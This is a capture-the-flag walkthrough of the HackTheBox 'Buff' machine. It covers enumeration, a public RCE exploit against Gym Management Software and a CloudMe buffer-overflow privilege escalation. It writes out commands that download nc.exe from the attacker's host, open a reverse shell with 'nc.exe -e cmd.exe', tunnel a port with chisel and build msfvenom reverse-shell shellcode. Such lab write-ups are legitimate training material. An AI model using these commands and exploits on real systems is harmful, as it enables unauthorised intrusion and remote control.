---
title: Classified
published: true
---

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/profile.png)

## Content
1. [Introduction](#introduction)
2. [Enumertion](#enumeration)
3. [FootHold](#foothold)
4. [Getting Proper Shell](#getting-proper-shell)
5. [Privilege Escalation](#privilege-escalation)

## Introduction

In my experience Buff Machine was overall a very good which teaches the basis of Enumeration, TCP-tunneling and Buffer-Overflow. The Machine was based on CVE so no manual exploitation was required. The User shell was pretty easy to get. For root shell we have to use knowledge of some advance techniques like TCP-Tunneling and Buffer Overflow. So Enjoy you'r learning.

## **Enumeration**

This is the important phase of any challange in HackTheBox. Always remember Enumeration is the key. Whenever you are stuck always get back to enumeration phase because most of the time people miss the small details. So lets begin our challange.

### Nmap Scan

So first things first we are going to scan this machine for open ports and services.

`sudo nmap -sC -sV -O -oN nmap/buff 10.10.10.198`

``` 
 -sC : Perform nmap scan using default scripts (NOTE: You can use specific lua scripts to perform custom scans, please refer to man page)
 -sV : Try to get the version of the services running in the system (NOTE: It does not return version of unknown services)
 -O  : Operating System fingerprinting/Tries to guess which OS is running in the system
 -oA : Output in all format inside nmap folder with name buff
```

We got the nmap output. Let's examin it.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/nmap.png)

So there is only one port open which is `port 8080/tcp` which is running `Apache httpd 2.4.43` and have http-title `mrb3 Bro Hut`. We also get information that the server is running php whose version is `PHP/7.4.6` and `OpenSSL/1.1.1g` and this is it, There are no more ports open in system.

> **NOTE**: 
There is one thing i need to tell you reader. In the above nmap scan i haven't specified port range so nmap uses it's default range. To Scan the complete 65535 ports you can use `-p-` flag but it will take hell lot of time believe me. There are tools which you can use to scan port in matter of seconds. You can try [`rustscan`](https://github.com/RustScan/RustScan) or [`masscan`](https://github.com/robertdavidgraham/masscan).

### Banner Grabbing

Let's take a look at banner. Most of the time you can get lots and lots of information just from banner grabbing. For example which server it is running, Which PHP version it is running, Content-Length and list goes on. Don't ever underestimate banner grabbing because i have faced some challanges where banner grabbing gives you the information of vulnerable service running in the system. So lets begin.

I am using telnet for banner grabbing. You can use NetCat for this purpose if you like. You can also use nmap to grab banner.

First we are going to connect to port 8080 of the machine.

`telnet 10.10.10.198 8080`

when it is connected we have to send request with HEAD method to to get the banner

`HEAD / HTTP/1.1`

`Host: 10.10.10.198`

You will get output like the image.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/banner.png)

Its giving us same info which nmap gave us. There are some extra things like Cookie, Cache-Control etc. etc.. They are not looking that intresting to us. So let's move ahead.

## **Foothold**

### Visit to port 8080

So we have seen in the nmap scan that port 8080/tcp is open which is running apace server. So let's take a look. Visiting to the webpage we see the following webpage.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/home.png)

The first thing which i do is check if `robots.txt` is present or not. Unfortunately we are out of luck this time. Second thing i try to look at the source code and look for anything fishy, but again i didn't find anything. Looking here and there we found something intresting in the contact page.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/contact.png)

`Gym Management Software 1.0` that's looking intresting. Lets google it.

### Googling

So after some Googling we found this

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/exploit.png)

So we have an Unauthenticated Remote Command Execution. So lets download the exploit and try it.

### Unauthenticated Remote Command Execution

We can see that the code is written in python. So lets execute the exploit

`python exploit.py`

We get the following output

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/expbanner.png)

So we have to pass the <WEBAPP_URL> to the exploit to work. So let's do it

`python exploit.py 'http://10.10.10.198/8080/'`

Andddd.... Bingo!! We got a RCE in the machine

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/postexp.png)

We can see that we are user `buff\shaun`. Now lets move ahead..

## **Getting Proper Shell**

So now after getting a RCE we have to get a shell. There are many ways to get a shell if you have RCE in a machine. This is one of the method. So let's start with uploading a [`nc.exe`](https://eternallybored.org/misc/netcat/) in the machine.

1. Host a python server in which nc.exe is present

    `python3 -m http.server`

2. Now execute the following command after we have RCE.

    `cmd.exe /c curl http://<your tun0 IP address>:8000/nc.exe -o nc.exe`

```
 cmd.exe : we are executing command prompt in the machine
 /c      : this options will run the following command in the cmd.exe
 curl    : Command line tool to transfer data
 -o      : output filename  
```

We will see that we get a GET request for nc.exe in our server 

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/pyget.png)

So now lets check if we have nc.exe in the system or not.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/checknc.png)

nc.exe upload successful!

First let's set up a listener in our machine using NetCat by entering the following command. I am setting the listener in port 9001.

`nc -nvlp 9001`

```
 -n : using IPv4 address 
 -p : port number
 -l : listening mode
 -v : verbose mode
```

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/listener.png)

Now let's do the magic. Enter the following command in the RCE shell

`nc.exe -e cmd.exe <your tun0 IP address> <port number>`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/foothold.png)

and press enter.....and boom we get a shell.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/footholdshell.png)

## **Privilege Escalation**

When i am writing this writup the ratio of (root:user) solves are very less. People are easily getting user shell but having a hard time getting root shell. So let's start out journey to get the shell flag.

So in the last section we got a proper shell in the machine. Now let's enumerate and try to search for something worth. After spending some time i get a executable file inside the `Downloads` folder of user `shaun`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/cloudexe.png)

It's a `CloudMe` executable. Well CloudMe is a cloud storage service. If you want to know more [click here](https://www.cloudme.com/en).
So let's do some research about `CloudMe`. 

After some googling we get a Buffer Overflow Vulnerability in Exploit-DB. Here is the [link](https://www.exploit-db.com/exploits/48389).

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/bufferoverflow.png)

Let's Download the exploit and understand it what it is doing.

So the exploit is a python script which contains payload to execute `calc.exe`. The script is creating a socket connection to `127.0.0.1:8888` and sending the payload. That's it..

Now what we have to do is change the shell code to execute a reverse shell and run the script in the vulnerable machine....but if you'll see there is no python in the machine.....you can try to look for yourself. So what to do now ? 

Maybe what we can do is run the script on our machine and change the ip address to vulnerable machine and execute the script so that it makes socket connection to 10.10.10.198:8888 and send the payload and execute the reverse shell..but if you'll try this it will just throw error saying unable to connect and remeber we didn't saw port 8888 active in our nmap scan also. There is something fishy down there.

Let's Check if the machine is listening on port 8888. Go to the machine shell and type the following command

`netstat -ano | findstr 8888`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/verifycloud.png)

Here we can see that the machine is listening in port 8888. So that means that we can only access to the port 8888 locally but not from outside because of firewall. That explains a lot.

Now what to do we cannot connect it from outside and there is no python in machine so how to send payload to port 8888 and get the shell...

The answer is TCP-Tunneling or Port-Forwarding. In simple word port forwarding redirects a request from one ipaddress and port to another ip address and port. You can learn more about port forwarding and tunneling [here](https://book.hacktricks.xyz/tunneling-and-port-forwarding) and [here](https://support.anydesk.com/TCP-Tunneling)

### TCP-Tunneling

To perform TCP-Tunneling i'll use `chisel`. You can download it from [here](https://github.com/jpillora/chisel). You can also use `plink` if you want. I use chisel because why not ;-). So let's download chisel executable for linux and windows from releases.

Now we should upload the chisel.exe to vulnerable machine. To do this follow that same process like we have done to upload [NetCat](#getting-proper-shell).

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/cupload.png)

Now let's tunnel it. 

First set up the chisel server in your machine using the command below.

`./chisel_linux server -p 8000 --reverse`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/chiselserver.png)

Now go to vulnerable machine and type the following command inside the `C:\xampp\htdocs\gym\upload` folder.

`cmd.exe command : chisel.exe client <your tun0 IP address> 8000 R:8888:127.0.0.1:8888`

`powershell.exe command : ./chisel.exe client <your tun0 IP address 8000 R:8888:127.0.0.1:8888>`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/chiselclient.png)

> **NOTE** : In the above image i am using powershell. You have to use cmd.exe command.

### Creating Payload

Now's Let's create out shellcode to get a reverse shell in out machine. To create our shellcode we are going to use `msfvenom`. If you don't know about msfvenom [here](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) is the link. In short msfvenom is a tool use to make shellcodes. So let's create out payload 

Enter the following command in your machine

`msfvenom -p windows/shell_reverse_tcp LHOST=<your tun0 IP Address> LPORT=4444`

```
 -p     :  it specifies the type of payload we are creating
 LHOST  :  Our Machine IP Address
 LPORT  :  Port Number in which connection will be stablished
```

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/msfvenom.png)

Now copy the shellcode in out python exploit script as shown below

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/cloudexploit.png)

Let's set up a litener to port `4444` using NetCat for incoming reverse shell.

`nv -nvlp 4444`

Now Moment of truth. We are going to execute the script and our script is going to connect to port 8888 and send payload there, Now because of TCP-tunneling our payload should be redirected to the vulnerable machine and execute out payload. Let's execute the script and see what happends.

`python cloudexploit.py`

Anddd... Boom! We get a root shell.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Buff/rootshell.png)

> **NOTE** : If the exploit doesn't word execute it multiple time.

Thanks for reading this post. If you think that something is missing or you didn't get it please feel free to email me at `cyber.antiru@gmail.com`.

So Keep Hacking and see you in another post.